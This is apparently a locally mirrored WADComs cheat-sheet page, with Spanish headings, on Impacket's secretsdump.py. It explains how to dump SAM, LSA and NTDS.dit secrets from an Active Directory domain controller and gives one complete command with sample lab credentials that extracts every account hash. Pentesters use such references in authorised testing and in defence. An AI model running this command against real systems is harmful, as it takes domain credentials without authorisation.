# WADComs: Impacket-SecretsDump-NTDS

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Password`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's secretsdump.py will perform various techniques to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit. The following command will attempt to use the specified machines NTDS.dit and system file to extract the user account hashes associated with that machine.

Command Reference:

	Target IP: 10.10.10.2

	Domain Controller: 10.10.10.1

	Domain: test.local

	Username: john

	Password: password123

## Comando

```bash
python3 secretsdump.py -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system -dc-ip 10.10.10.1 test.local/john:password123@10.10.10.2
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
- https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#secretsdumppy
